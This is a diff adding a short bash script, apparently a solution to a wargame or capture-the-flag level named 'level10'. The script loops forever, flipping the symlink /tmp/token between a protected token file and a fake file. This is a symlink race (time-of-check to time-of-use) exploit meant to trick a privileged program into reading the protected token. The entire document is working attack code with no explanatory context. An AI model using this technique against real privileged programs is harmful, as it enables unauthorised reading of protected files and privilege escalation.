@@ -1,0 +1,6 @@
+#!/bin/bash
+
+while true; do
+  ln -sf /home/user/level10/token /tmp/token
+  ln -sf /tmp/fake /tmp/token
+done
